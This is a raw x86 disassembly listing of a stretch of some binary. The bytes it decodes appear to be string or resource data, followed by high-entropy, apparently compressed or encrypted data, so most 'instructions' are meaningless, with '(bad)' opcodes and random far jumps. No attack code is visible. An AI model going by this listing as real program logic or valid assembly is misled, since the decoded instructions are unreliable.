  4105bd:	add    BYTE PTR [eax],al
  4105bf:	jnp    0x4105dc
  4105c1:	adc    BYTE PTR [eax],al
  4105c3:	lods   al,BYTE PTR ds:[esi]
  4105c4:	push   ebp
  4105c5:	adc    BYTE PTR [eax],al
  4105c7:	punpcklwd mm2,DWORD PTR [eax]
  4105ca:	add    BYTE PTR [edi+0x6300100d],ch
  4105d0:	adc    BYTE PTR gs:[eax],al
  4105d3:	shl    BYTE PTR [edi],0x10
  4105d6:	add    BYTE PTR [ecx+0x7300101d],dh
  4105dc:	js     0x4105ee
  4105de:	add    BYTE PTR [ebp+0x38],al
  4105e1:	xor    eax,0x565f3235
  4105e6:	aaa    
  4105e7:	add    BYTE PTR [eax+0x30],dl
  4105ea:	push   esp
  4105eb:	pop    edi
  4105ec:	inc    edi
  4105ed:	dec    ebp
  4105ee:	xor    bl,BYTE PTR [edx+0x5f]
  4105f1:	inc    esp
  4105f2:	ss xor BYTE PTR ss:0x4f494c00,dh
  4105fa:	xor    BYTE PTR [edi],dh
  4105fc:	pop    edi
  4105fd:	dec    edx
  4105fe:	inc    ecx
  4105ff:	add    BYTE PTR [ecx+0x47],bl
  410602:	pop    edx
  410603:	xor    eax,0x4442595f
  410608:	dec    esi
  410609:	inc    ebx
  41060a:	pop    edi
  41060b:	xor    eax,0x334a0048
  410610:	push   ecx
  410611:	pop    edi
  410612:	xor    al,BYTE PTR [esi+0x35]
  410615:	push   eax
  410616:	cmp    DWORD PTR [eax],edi
  410618:	add    BYTE PTR [ebp+0x32],dl
  41061b:	push   edi
  41061c:	xor    BYTE PTR [edi+0x42],bl
  41061f:	dec    eax
  410620:	inc    ebp
  410621:	pop    edi
  410622:	xor    ebx,DWORD PTR [eax+0x46]
  410625:	dec    ebx
  410626:	inc    esp
  410627:	aaa    
  410628:	add    BYTE PTR [edi+0x46],cl
  41062b:	push   esi
  41062c:	xor    al,0x34
  41062e:	pop    edi
  41062f:	inc    edi
  410630:	inc    edi
  410631:	push   esp
  410632:	pop    edx
  410633:	inc    edx
  410634:	pop    edi
  410635:	push   ebp
  410636:	add    BYTE PTR [edi+0x41],al
  410639:	xor    al,0x39
  41063b:	xor    BYTE PTR [edi+0x39],bl
  41063e:	inc    edx
  41063f:	add    BYTE PTR [esi+0x36],cl
  410642:	xor    bl,BYTE PTR [edi+0x41]
  410645:	xor    ebx,DWORD PTR ss:[edi+0x38]
  410649:	xor    eax,DWORD PTR [ecx+0x52]
  41064c:	push   ebx
  41064d:	pop    edi
  41064e:	inc    esi
  41064f:	add    BYTE PTR [ecx+0x57],al
  410652:	push   ebp
  410653:	pop    edi
  410654:	inc    esi
  410655:	pop    edx
  410656:	push   ebp
  410657:	xor    dh,BYTE PTR [esi]
  410659:	add    BYTE PTR [edi+0x48],al
  41065c:	xor    BYTE PTR [edi+0x33],bl
  41065f:	inc    ebp
  410660:	cmp    DWORD PTR [edi+0x5f],ecx
  410663:	push   ebx
  410664:	cmp    DWORD PTR [eax],eax
  410666:	push   esp
  410667:	xor    al,0x51
  410669:	cmp    BYTE PTR [esi],dh
  41066b:	pop    edi
  41066c:	push   esp
  41066d:	dec    ecx
  41066e:	dec    edi
  41066f:	add    BYTE PTR [esp+ecx*2+0x5a],al
  410673:	pop    edi
  410674:	pop    edx
  410675:	dec    edx
  410676:	cmp    BYTE PTR [ebx+eax*2+0x5f],dl
  41067a:	cmp    DWORD PTR [ecx],edi
  41067c:	add    BYTE PTR [eax+0x4e],dl
  41067f:	xor    al,0x5f
  410681:	dec    esi
  410682:	inc    esp
  410683:	xor    DWORD PTR [edi],esi
  410685:	pop    edi
  410686:	cmp    DWORD PTR [ecx+0x41],edx
  410689:	add    BYTE PTR [edx+0x54],cl
  41068c:	xor    bl,BYTE PTR [edi+0x50]
  41068f:	push   ebx
  410690:	push   esi
  410691:	inc    esp
  410692:	pop    edi
  410693:	push   edx
  410694:	xor    BYTE PTR [ecx+0x0],bl
  410697:	push   esi
  410698:	inc    esp
  410699:	push   esp
  41069a:	pop    edi
  41069b:	dec    esp
  41069c:	xor    al,0x33
  41069e:	cmp    DWORD PTR [eax+eax*1+0x59],edx
  4106a2:	inc    edi
  4106a3:	inc    ebp
  4106a4:	pop    edi
  4106a5:	push   ebp
  4106a6:	pop    edx
  4106a7:	push   eax
  4106a8:	dec    edi
  4106a9:	pop    edi
  4106aa:	push   esi
  4106ab:	xor    BYTE PTR [eax],al
  4106ad:	pop    eax
  4106ae:	push   edi
  4106af:	push   esi
  4106b0:	cmp    BYTE PTR [edi+0x47],bl
  4106b3:	dec    ecx
  4106b4:	push   esp
  4106b5:	push   edx
  4106b6:	dec    ebx
  4106b7:	xor    BYTE PTR [edi+0x0],cl
  4106ba:	dec    ecx
  4106bb:	dec    esi
  4106bc:	xor    eax,0x33345f30
  4106c1:	push   eax
  4106c2:	dec    edx
  4106c3:	cmp    BYTE PTR [eax],al
  4106c5:	pop    eax
  4106c6:	inc    ecx
  4106c7:	dec    esi
  4106c8:	pop    edi
  4106c9:	inc    edx
  4106ca:	push   ebp
  4106cb:	push   ecx
  4106cc:	pop    edi
  4106cd:	inc    ecx
  4106ce:	add    BYTE PTR [edi+0x58],al
  4106d1:	xor    BYTE PTR [edi+0x4c],bl
  4106d4:	dec    ebp
  4106d5:	cmp    DWORD PTR [ebp+0x5f],edx
  4106d8:	push   esp
  4106d9:	push   edx
  4106da:	add    BYTE PTR [eax+0x38],cl
  4106dd:	dec    edi
  4106de:	xor    eax,0x594b535f
  4106e3:	xor    BYTE PTR [ebp+0x0],cl
  4106e6:	inc    ecx
  4106e7:	dec    eax
  4106e8:	xor    DWORD PTR [edi+0x4e],ebx
  4106eb:	ss inc esp
  4106ed:	dec    eax
  4106ee:	cmp    DWORD PTR [eax],eax
  4106f0:	push   esi
  4106f1:	push   esp
  4106f2:	aaa    
  4106f3:	xor    bh,BYTE PTR [ecx]
  4106f5:	xor    al,0x31
  4106f7:	pop    edi
  4106f8:	push   edx
  4106f9:	push   edi
  4106fa:	push   edx
  4106fb:	dec    ecx
  4106fc:	pop    edi
  4106fd:	inc    esp
  4106fe:	add    BYTE PTR [edi+0x52],dl
  410701:	pop    ecx
  410702:	xor    eax,0x5045395f
  410707:	pop    edi
  410708:	xor    eax,DWORD PTR [eax]
  41070a:	inc    ebp
  41070b:	xor    dl,BYTE PTR [ebx+0x39]
  41070e:	xor    dh,BYTE PTR [esi]
  410710:	xor    eax,0x4900525f
  410715:	push   esp
  410716:	xor    bl,BYTE PTR [edi+0x41]
  410719:	dec    edx
  41071a:	xor    eax,0x4c3737
  41071f:	push   ecx
  410720:	add    BYTE PTR [edi+0x0],al
  410723:	pop    ecx
  410724:	add    BYTE PTR [edi+0x0],bl
  410727:	push   ebx
  410728:	add    BYTE PTR [ebx+0x0],al
  41072b:	xor    al,BYTE PTR [eax]
  41072d:	pop    edx
  41072e:	add    BYTE PTR [edi+0x0],dl
  410731:	add    BYTE PTR [eax],al
  410733:	push   edx
  410734:	add    BYTE PTR [eax+eax*1+0x4d],dl
  410738:	add    BYTE PTR [edi+0x0],bl
  41073b:	dec    eax
  41073c:	add    BYTE PTR [ebx+0x0],cl
  41073f:	xor    DWORD PTR [eax],eax
  410741:	pop    edi
  410742:	add    BYTE PTR [ecx+0x0],al
  410745:	push   ebp
  410746:	add    BYTE PTR [ecx],bh
  410748:	add    BYTE PTR [esi+0x0],dl
  41074b:	xor    al,BYTE PTR [eax]
  41074d:	pop    edi
  41074e:	add    BYTE PTR [edx],dh
  410750:	add    BYTE PTR [eax],al
  410752:	add    BYTE PTR [ecx+0x0],dl
  410755:	xor    al,0x0
  410757:	inc    edx
  410758:	add    BYTE PTR [edi+0x0],bl
  41075b:	inc    esp
  41075c:	add    BYTE PTR [esi+0x0],dl
  41075f:	xor    eax,0x5f005500
  410764:	add    BYTE PTR [ebx+0x0],al
  410767:	inc    ebx
  410768:	add    BYTE PTR [eax],al
  41076a:	add    BYTE PTR [eax+0x0],cl
  41076d:	inc    edx
  41076e:	add    BYTE PTR [ecx+0x0],dl
  410771:	pop    edi
  410772:	add    BYTE PTR [eax+eax*1+0x38],dl
  410776:	add    BYTE PTR [eax+0x0],dl
  410779:	push   edx
  41077a:	add    BYTE PTR [ecx+0x0],cl
  41077d:	pop    edi
  41077e:	add    BYTE PTR [ebp+0x0],al
  410781:	dec    ebp
  410782:	add    BYTE PTR [ebp+0x0],dl
  410785:	add    BYTE PTR [eax],al
  410787:	inc    edi
  410788:	add    BYTE PTR [edi+0x0],cl
  41078b:	xor    eax,0x32005f00
  410790:	add    BYTE PTR [ebx+0x0],dl
  410793:	inc    ebp
  410794:	add    BYTE PTR [ecx],bh
  410796:	add    BYTE PTR [esi],dh
  410798:	add    BYTE PTR [edi+0x0],bl
  41079b:	pop    eax
  41079c:	add    BYTE PTR [edx+0x0],bl
  41079f:	xor    al,0x0
  4107a1:	pop    edi
  4107a2:	add    BYTE PTR [edi+0x0],cl
  4107a5:	add    BYTE PTR [eax],al
  4107a7:	push   ebx
  4107a8:	add    BYTE PTR [eax],dh
  4107aa:	add    BYTE PTR [ecx+0x0],dl
  4107ad:	pop    edi
  4107ae:	add    BYTE PTR [ebp+0x0],dl
  4107b1:	dec    ecx
  4107b2:	add    BYTE PTR [ecx+0x0],bl
  4107b5:	xor    al,BYTE PTR [eax]
  4107b7:	add    BYTE PTR [eax],al
  4107b9:	dec    eax
  4107ba:	add    BYTE PTR [edi],dh
  4107bc:	add    BYTE PTR [ecx+0x0],bl
  4107bf:	aaa    
  4107c0:	add    BYTE PTR [edi+0x0],bl
  4107c3:	inc    esi
  4107c4:	add    BYTE PTR [edi],dh
  4107c6:	add    BYTE PTR [ecx+0x0],bl
  4107c9:	inc    esp
  4107ca:	add    BYTE PTR [edi+0x0],bl
  4107cd:	xor    eax,0x52000000
  4107d2:	add    BYTE PTR [eax+0x0],dl
  4107d5:	inc    esi
  4107d6:	add    BYTE PTR [edi+0x0],bl
  4107d9:	dec    esp
  4107da:	add    BYTE PTR [ecx+0x0],al
  4107dd:	push   eax
  4107de:	add    BYTE PTR [edi+0x0],bl
  4107e1:	inc    ecx
  4107e2:	add    BYTE PTR [edi],dh
  4107e4:	add    BYTE PTR [eax+eax*1+0x4a],al
  4107e8:	add    BYTE PTR [ebp+0x0],al
  4107eb:	pop    edi
  4107ec:	add    BYTE PTR [eax+eax*1],dh
  4107ef:	add    BYTE PTR [eax],al
  4107f1:	dec    esp
  4107f2:	add    BYTE PTR [edi],dh
  4107f4:	add    BYTE PTR [ebp+0x0],cl
  4107f7:	cmp    BYTE PTR [eax],al
  4107f9:	xor    al,BYTE PTR [eax]
  4107fb:	pop    edi
  4107fc:	add    BYTE PTR [eax],bh
  4107fe:	add    BYTE PTR [ecx+0x0],al
  410801:	pop    edx
  410802:	add    BYTE PTR [edx+0x0],bl
  410805:	pop    edi
  410806:	add    BYTE PTR [ebx],dh
  410808:	add    BYTE PTR [ebx+0x0],dl
  41080b:	add    BYTE PTR [eax],al
  41080d:	push   esi
  41080e:	add    BYTE PTR [eax],bh
  410810:	add    BYTE PTR [esi+0x0],dl
  410813:	xor    al,BYTE PTR [eax]
  410815:	pop    edi
  410816:	add    BYTE PTR [esi+0x0],al
  410819:	inc    ebx
  41081a:	add    BYTE PTR [edi+0x0],al
  41081d:	push   edi
  41081e:	add    BYTE PTR [edi+0x0],bl
  410821:	dec    eax
  410822:	add    BYTE PTR [edx+0x0],cl
  410825:	cmp    DWORD PTR [eax],eax
  410827:	aaa    
  410828:	add    BYTE PTR [eax],al
  41082a:	add    BYTE PTR [ecx+0x0],cl
  41082d:	dec    edx
  41082e:	add    BYTE PTR [ecx+0x0],al
  410831:	pop    edi
  410832:	add    BYTE PTR [edx+0x0],cl
  410835:	inc    esi
  410836:	add    BYTE PTR [edi+0x0],dl
  410839:	xor    eax,DWORD PTR [eax]
  41083b:	dec    ebp
  41083c:	add    BYTE PTR [edi+0x0],bl
  41083f:	push   eax
  410840:	add    BYTE PTR [ecx+0x0],al
  410843:	add    BYTE PTR [eax],al
  410845:	dec    edi
  410846:	add    BYTE PTR [ecx+0x0],bl
  410849:	dec    eax
  41084a:	add    BYTE PTR [edi+0x0],bl
  41084d:	xor    eax,0x0
	...
  41085a:	add    al,0x0
  41085c:	add    BYTE PTR [eax],al
  41085e:	add    BYTE PTR [eax],al
  410860:	add    BYTE PTR [eax],al
  410862:	add    dh,BYTE PTR [ecx+eax*2]
  410865:	add    BYTE PTR [esi],al
  410867:	xor    al,0x41
  410869:	add    BYTE PTR [edx],cl
  41086b:	xor    al,0x41
  41086d:	add    BYTE PTR [esi],cl
  41086f:	xor    al,0x41
  410871:	add    BYTE PTR [edx],dl
  410873:	xor    al,0x41
  410875:	add    BYTE PTR [esi],dl
  410877:	xor    al,0x41
  410879:	add    BYTE PTR [edx],bl
  41087b:	xor    al,0x41
  41087d:	add    BYTE PTR [esi],bl
  41087f:	xor    al,0x41
  410881:	add    BYTE PTR [ebp-0x29],dl
  410884:	mov    edx,0x7defba87
  410889:	xlat   BYTE PTR ds:[ebx]
  41088a:	lea    esp,[esi+edx*4+0x6a]
  41088e:	rcl    BYTE PTR [edx+0xc4da3e9],cl
  410894:	add    DWORD PTR [eax],eax
  410896:	and    al,BYTE PTR [edi]
  410898:	add    BYTE PTR [eax],al
  41089a:	push   cs
  41089b:	lea    ebx,[edx+0x79]
  41089e:	inc    esi
  41089f:	add    edi,DWORD PTR [ecx-0x76]
  4108a2:	fistp  QWORD PTR [ebx+0x42]
  4108a5:	imul   DWORD PTR [ebp-0x208c942e]
  4108ab:	xchg   BYTE PTR [edi+0xe],cl
  4108ae:	pop    es
  4108af:	jge    0x410919
  4108b1:	inc    eax
  4108b2:	popf   
  4108b3:	fcomp  st(5)
  4108b5:	in     al,0x11
  4108b7:	sti    
  4108b8:	fidivr WORD PTR [eax]
  4108ba:	inc    ebx
  4108bb:	jle    0x41087d
  4108bd:	rol    BYTE PTR [eax-0x76],0x58
  4108c1:	shr    bh,cl
  4108c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108c4:	sub    edi,DWORD PTR [ecx]
  4108c6:	stc    
  4108c7:	dec    ebx
  4108c8:	cmp    edi,edx
  4108ca:	jb     0x4108c9
  4108cc:	popa   
  4108cd:	fisub  DWORD PTR [ebp+0x4]
  4108d0:	add    eax,0x5f70515e
  4108d5:	icebp  
  4108d6:	add    al,0x67
  4108d8:	gs inc esp
  4108da:	imul   BYTE PTR [ecx-0x53]
  4108dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108de:	pop    es
  4108df:	nop
  4108e0:	ss or  al,0x41
  4108e3:	test   al,dh
  4108e5:	rol    bl,cl
  4108e7:	or     eax,0xca430302
  4108ec:	(bad)  
  4108ed:	or     BYTE PTR [esi+0x30],0xb8
  4108f1:	aad    0xc1
  4108f3:	mov    ds:0xc00277d0,eax
  4108f8:	lahf   
  4108f9:	sahf   
  4108fa:	cwde   
  4108fb:	cs std 
  4108fd:	aad    0x6d
  4108ff:	jne    0x41097d
  410901:	jmp    0x3700:0x6435f11e
  410908:	pop    esi
  410909:	(bad)  
  41090a:	ss ja  0x41095f
  41090d:	xor    dl,ch
  41090f:	push   ebx
  410910:	push   ecx
  410911:	jmp    0xa712:0xca6385e8
  410918:	dec    edi
  410919:	out    dx,eax
  41091a:	out    dx,eax
  41091b:	cmc    
  41091c:	pop    ds
  41091d:	push   0x3ea49f5
  410922:	idiv   esp
  410924:	inc    ebp
  410925:	iret   
  410926:	fisttp QWORD PTR [ebx]
  410928:	call   0x601e808a
  41092d:	xor    dl,BYTE PTR [ecx+esi*8-0x30]
  410931:	rcl    BYTE PTR [eax+0x5e6dacdf],cl
  410937:	xchg   esi,eax
  410938:	mov    ebp,0x926cbe2f
  41093d:	dec    ebp
  41093e:	(bad)  
  41093f:	jnp    0x410959
  410941:	dec    ebp
  410942:	cmp    DWORD PTR [eax],0x15
  410945:	ret    0x749c
  410948:	cmp    ch,0x3a
  41094b:	dec    edi
  41094c:	add    BYTE PTR [eax+0x1d120db2],al
  410952:	fcmovnbe st,st(2)
  410954:	inc    ebx
  410955:	jge    0x410950
  410957:	mov    BYTE PTR [edx+0x549de463],bl
  41095d:	dec    edx
  41095e:	call   0x8499820d
  410963:	sub    eax,0x935c3008
  410968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410969:	daa    
  41096a:	cmc    
  41096b:	mov    cs,WORD PTR [eax+eiz*4-0x58603553]
  410972:	daa    
  410973:	in     al,dx
  410974:	push   edi
  410975:	in     eax,dx
  410976:	test   al,0xeb
  410978:	or     eax,0x53699472
  41097d:	ins    DWORD PTR es:[edi],dx
  41097e:	pop    eax
  41097f:	mov    bh,0x60
  410981:	jmp    0xdf89:0x64a8d5e1
  410988:	add    DWORD PTR [edi-0x70],edx
  41098b:	push   0xc0b43537
  410990:	push   edi
  410991:	xlat   BYTE PTR ds:[ebx]
  410992:	iret   
  410993:	fsubr  DWORD PTR [edx-0x63c84fb1]
  410999:	add    DWORD PTR [ecx+0x31d3c7a7],0xffffffc9
  4109a0:	jns    0x41094b
  4109a2:	(bad)  
  4109a3:	sbb    edx,esp
  4109a5:	loope  0x410963
  4109a7:	ins    DWORD PTR es:[edi],dx
  4109a8:	mov    eax,0x8ac88410
  4109ad:	xlat   BYTE PTR ds:[ebx]
  4109ae:	test   BYTE PTR [ebx+0x68c00871],ch
  4109b4:	aam    0x1b
  4109b6:	adc    al,0x46
  4109b8:	pop    es
  4109b9:	ret    0x1e98
  4109bc:	jbe    0x41094e
  4109be:	mov    bl,0xb2
  4109c0:	lahf   
  4109c1:	in     eax,dx
  4109c2:	lods   eax,DWORD PTR ds:[esi]
  4109c3:	sbb    bh,BYTE PTR [eax]
  4109c5:	rol    BYTE PTR [edx-0x9],0x2e
  4109c9:	push   ss
  4109ca:	es (bad) 
  4109cc:	mov    ds:0x79b3be68,eax
  4109d1:	inc    ecx
  4109d2:	xor    DWORD PTR [ecx-0x2],esi
  4109d5:	das    
  4109d6:	stc    
  4109d7:	sub    eax,0xc48db66d
  4109dc:	clc    
  4109dd:	jmp    0x4109f7
  4109df:	sub    DWORD PTR [eax],eax
  4109e1:	cmp    al,0xca
  4109e3:	sbb    eax,0x961183f
  4109e8:	(bad)  
  4109e9:	sbb    DWORD PTR [ecx+0x4b85402b],0x74
  4109f0:	sub    DWORD PTR [ebp+0x18],esp
  4109f3:	adc    dh,BYTE PTR [esi+eiz*2-0x6af3e277]
  4109fa:	neg    BYTE PTR [edx-0x77]
  4109fd:	clc    
  4109fe:	lahf   
  4109ff:	xchg   bp,ax
  410a01:	adc    BYTE PTR [edx+0x6f],bl
  410a04:	pop    eax
  410a05:	test   al,0x13
  410a07:	dec    ch
  410a09:	fwait
  410a0a:	xchg   ebx,eax
  410a0b:	add    eax,0x5884a79e
  410a10:	mov    WORD PTR cs:[edx-0x8],ds
  410a14:	cmp    al,BYTE PTR [eax+eiz*8-0x9]
  410a18:	jno    0x4109da
  410a1a:	mov    dl,0xf7
  410a1c:	mov    eax,0x6c7764f4
  410a21:	fisub  WORD PTR [esi+0x7efa58e]
  410a27:	xor    ebp,ebp
  410a29:	in     al,0xed
  410a2b:	sub    esi,0x5b
  410a2e:	jbe    0x410a16
  410a30:	out    0x14,al
  410a32:	repz ja 0x4109e5
  410a35:	outs   dx,BYTE PTR ds:[esi]
  410a36:	push   cs
  410a37:	push   eax
  410a38:	rcr    DWORD PTR [ebx],cl
  410a3a:	ja     0x410ab2
  410a3c:	aaa    
  410a3d:	stos   DWORD PTR es:[edi],eax
  410a3e:	call   0xe20d:0x11679364
  410a45:	pop    esi
  410a46:	xlat   BYTE PTR ds:[ebx]
  410a47:	sti    
  410a48:	push   edi
  410a49:	inc    esi
  410a4a:	or     bh,BYTE PTR [eax+ebx*4]
  410a4d:	js     0xb290c579
  410a53:	out    0x91,al
  410a55:	dec    esp
  410a56:	mov    WORD PTR [edx-0x6b],fs
  410a59:	inc    edi
  410a5a:	pop    ebx
  410a5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a5c:	rol    DWORD PTR [eax+0x7306f3f5],cl
  410a62:	inc    ebp
  410a63:	pop    DWORD PTR [eax-0x7c]
  410a66:	ins    BYTE PTR es:[edi],dx
  410a67:	leave  
  410a68:	mov    ebx,0x158040f4
  410a6d:	fwait
  410a6e:	jl     0x410a5a
  410a70:	aam    0x9a
  410a72:	test   edi,eax
  410a74:	mov    esp,0xda1499c5
  410a79:	pop    ecx
  410a7a:	and    di,ax
  410a7d:	std    
  410a7e:	call   0x3982:0x4bf4c2e7
  410a85:	sbb    DWORD PTR [edi-0x6b],ebp
  410a88:	mov    ch,0xc2
  410a8a:	mov    BYTE PTR [ebx-0xf64cd72],bh
  410a90:	repnz inc ebp
  410a92:	push   esp
  410a93:	mov    al,ds:0xe288fce0
  410a98:	jnp    0x410a64
  410a9a:	(bad)  
  410a9b:	pop    ebx
  410a9c:	mov    ah,0x89
  410a9e:	icebp  
  410a9f:	fist   WORD PTR [ebx+0x71]
  410aa2:	(bad)  
  410aa4:	sbb    ebp,edi
  410aa6:	and    bl,ah
  410aa8:	cmp    dl,BYTE PTR [edx]
  410aaa:	xor    BYTE PTR [eax+0xc],bl
  410aad:	mov    DWORD PTR [esi-0x11e1c2db],edi
  410ab3:	or     dh,dh
  410ab5:	test   eax,0xd6c1a554
  410aba:	sbb    bh,dh
  410abc:	dec    esp
  410abd:	mov    ah,0xaf
  410abf:	mov    gs,WORD PTR [ebx-0x16]
  410ac2:	(bad)  
  410ac3:	jmp    0xb0181a18
  410ac8:	mul    DWORD PTR [esi-0x33]
  410acb:	inc    esi
  410acc:	jp     0x410a51
  410ace:	popa   
  410acf:	sub    ebp,DWORD PTR [esi+0x5f]
  410ad2:	mov    ds:0x20b15b08,al
  410ad7:	dec    ebp
  410ad8:	mov    edi,0x27323ee8
  410add:	adc    DWORD PTR [ebx],ecx
  410adf:	adc    al,0x21
  410ae1:	sub    BYTE PTR ds:[edi-0x7e527525],dh
  410ae8:	ja     0x410ab7
  410aea:	pop    ecx
  410aeb:	in     eax,0xe9
  410aed:	pop    eax
  410aee:	daa    
  410aef:	pop    ecx
  410af0:	repz jmp 0x495f:0x8b9a81f9
  410af8:	push   eax
  410af9:	xchg   ebx,eax
  410afa:	pop    esp
  410afb:	test   DWORD PTR [edi-0x7],edx
  410afe:	push   es
  410aff:	mov    ebx,0x8f41d882
  410b04:	or     DWORD PTR [ebx+edx*8+0x71e0d752],0x6dcfc263
  410b0f:	aad    0x9d
  410b11:	xor    eax,DWORD PTR [ecx+0x3]
  410b14:	daa    
  410b15:	loopne 0x410b88
  410b17:	adc    edi,DWORD PTR [ebp+0x2c]
  410b1a:	sub    edx,edx
  410b1c:	adc    al,0xe0
  410b1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b1f:	ret    0xc94
  410b22:	sar    BYTE PTR [edx],0x4b
  410b25:	out    dx,eax
  410b26:	mov    WORD PTR [ebx+0x2697ca36],cs
  410b2c:	mov    WORD PTR [edx-0x73],cs
  410b2f:	cmp    BYTE PTR [ecx],bh
  410b31:	mov    bh,0xfb
  410b33:	mov    eax,ds:0xa951a1bb
  410b38:	xchg   BYTE PTR [edi],ah
  410b3a:	imul   ebp,DWORD PTR [edx],0x8b468b94
  410b40:	ds jmp 0xf3a6:0x5acffac6
  410b48:	fucomi st,st(7)
  410b4a:	or     ebp,DWORD PTR [eax+0x53]
  410b4d:	retf   0x41f0
  410b50:	fsubr  QWORD PTR [esp+eax*2]
  410b53:	and    eax,0x77f6ec17
  410b58:	inc    edx
  410b59:	jmp    FWORD PTR [ebx-0x2e98dbc5]
  410b5f:	aaa    
  410b60:	addr16 xchg ebp,eax
  410b62:	dec    edx
  410b63:	xchg   esp,eax
  410b64:	add    edx,DWORD PTR [ecx-0xd2b2fd9]
  410b6a:	out    0xb3,eax
  410b6c:	cwde   
  410b6d:	repnz pop ds
  410b6f:	lea    esi,ds:0x2a92b921
  410b75:	sub    edi,0xffffffe0
  410b78:	mov    bl,0x7d
  410b7a:	push   esp
  410b7b:	xor    BYTE PTR [edx*8+0x2c0e6b3b],ch
  410b82:	mov    bl,0x49
  410b84:	loope  0x410bf0
  410b86:	xchg   BYTE PTR [edx],dl
  410b88:	pop    esi
  410b89:	push   ebp
  410b8a:	loopne 0x410bfe
  410b8c:	test   BYTE PTR [esi],dl
  410b8e:	and    eax,0x4a0ad158
  410b93:	pop    esi
  410b94:	mov    ebx,0xa85ffddc
  410b9a:	in     eax,dx
  410b9b:	pop    ebp
  410b9c:	outs   dx,DWORD PTR ds:[esi]
  410b9d:	out    dx,al
  410b9e:	xchg   ebx,eax
  410b9f:	cwde   
  410ba0:	dec    ebx
  410ba1:	fnstsw WORD PTR [esi+0x54d14624]
  410ba7:	cmp    al,0x0
  410ba9:	add    edi,DWORD PTR [ebx+0x17]
  410bac:	sbb    al,0xff
  410bae:	xor    eax,0xd58553ec
  410bb3:	lods   al,BYTE PTR ds:[esi]
  410bb4:	lods   eax,DWORD PTR ds:[esi]
  410bb5:	mov    ah,0xd2
  410bb7:	adc    BYTE PTR [edi],bl
  410bb9:	and    DWORD PTR [ebx+0x2c6b2e64],0xffffffbd
  410bc0:	mov    ebp,0x3959d968
  410bc5:	mov    eax,ds:0x407b6d78
  410bca:	cmc    
  410bcb:	push   ebp
  410bcc:	cmp    ebx,ebx
  410bce:	inc    eax
  410bcf:	sub    eax,0x4c4930ea
  410bd4:	sbb    eax,0x121ddfd1
  410bd9:	int3   
  410bda:	mov    al,ds:0x6253be99
  410bdf:	(bad)  
  410be0:	or     dh,BYTE PTR [eax]
  410be2:	inc    eax
  410be3:	xor    eax,0x17209c1e
  410be8:	mov    eax,0x5985e1f1
  410bed:	jle    0x410c03
  410bef:	add    BYTE PTR [ebx-0x19d419bb],ah
  410bf5:	ret    0x1d84
  410bf8:	(bad)  
  410bf9:	cmc    
  410bfa:	add    esp,DWORD PTR fs:[edi]
  410bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bfe:	mov    esi,0xd487935e
  410c03:	jle    0x410bac
  410c05:	add    ebp,DWORD PTR [ebx+edi*4]
  410c08:	mov    dl,BYTE PTR [eax+0x78980217]
  410c0e:	bound  esp,QWORD PTR [ecx-0x39]
  410c11:	arpl   WORD PTR [edi-0x48],bp
  410c14:	fwait
  410c15:	test   BYTE PTR [eax-0xdae13f8],ch
  410c1b:	ds jmp 0xdbe4:0x40bc269
  410c23:	repnz adc ah,BYTE PTR [ebx]
  410c26:	ret    
  410c27:	push   ebp
  410c28:	btc    DWORD PTR [ebp-0x7d],0x68
  410c2d:	loope  0x410be2
  410c2f:	jp     0x410c3a
  410c31:	jmp    0x340c30b7
  410c36:	jo     0x410c9f
  410c38:	push   ebp
  410c39:	fwait
  410c3a:	mov    ebx,0xdf8759d5
  410c3f:	sbb    eax,0x84858dab
  410c44:	inc    ebp
  410c45:	pusha  
  410c46:	push   ebp
  410c47:	sub    al,0x60
  410c49:	ds out 0xea,eax
  410c4c:	into   
  410c4d:	push   ds
  410c4e:	pop    esp
  410c4f:	sub    DWORD PTR ds:0x9d616b30,eax
  410c55:	aas    
  410c56:	shr    DWORD PTR [edi-0x5b],0xd6
  410c5a:	xchg   esi,eax
  410c5b:	mov    dh,BYTE PTR [edi+0x45]
  410c5e:	mov    edi,0xe017c138
  410c63:	outs   dx,WORD PTR ds:[esi]
  410c65:	cwde   
  410c66:	mov    dl,0xb6
  410c68:	and    dl,BYTE PTR [eax]
  410c6a:	(bad)  
  410c6b:	imul   edi,edi,0x42
  410c6e:	les    ebx,FWORD PTR [ebp+0x51994576]
  410c74:	jg     0x410cc5
  410c76:	jae    0x410cef
  410c78:	popf   
  410c79:	stos   DWORD PTR es:[edi],eax
  410c7a:	aad    0x17
  410c7c:	mov    gs,WORD PTR [ecx-0x6c627b2c]
  410c82:	push   eax
  410c83:	sbb    BYTE PTR [eax+0x7e687a6e],ch
  410c89:	cwde   
  410c8a:	push   ds
  410c8b:	mov    ds:0xed13a864,eax
  410c90:	test   DWORD PTR [esi+eax*8-0x1],ecx
  410c94:	sub    ebx,DWORD PTR [esi+0x335ad955]
  410c9a:	push   edx
  410c9b:	adc    esi,esi
  410c9d:	ffree  st(0)
  410c9f:	cld    
  410ca0:	add    eax,0x98a3cb76
  410ca5:	inc    eax
  410ca6:	fs rcl cl,cl
  410ca9:	or     DWORD PTR ds:0x65f7f2f2,edi
  410caf:	fmul   QWORD PTR [esi-0x1b5f378f]
  410cb5:	adc    BYTE PTR [esi+0x54],dl
  410cb8:	aaa    
  410cb9:	mov    ds:0xcc276c1e,al
  410cbe:	js     0x410d15
  410cc0:	inc    edx
  410cc1:	sbb    eax,0x7a4b2300
  410cc6:	mov    ch,0x2c
  410cc8:	cwde   
  410cc9:	push   edx
  410cca:	stos   DWORD PTR es:[edi],eax
  410ccb:	cli    
  410ccc:	pusha  
  410ccd:	std    
  410cce:	seto   BYTE PTR [edx+esi*4+0x1eee51f4]
  410cd6:	icebp  
  410cd7:	sub    cl,0x3e
  410cda:	cmp    bh,ah
  410cdc:	mov    ebx,0xf1146170
  410ce1:	adc    al,0x52
  410ce3:	push   esp
  410ce4:	jmp    0x410c88
  410ce6:	rcl    ebx,cl
  410ce8:	jnp    0x410ceb
  410cea:	mov    dh,0xa4
  410cec:	push   edi
  410ced:	in     eax,0xfd
  410cef:	xor    BYTE PTR [ecx+0x54b419f0],0x40
  410cf6:	ja     0x410d5d
  410cf8:	retf   
  410cf9:	jle    0x410ccb
  410cfb:	fstp   st(6)
  410cfd:	and    al,0xc7
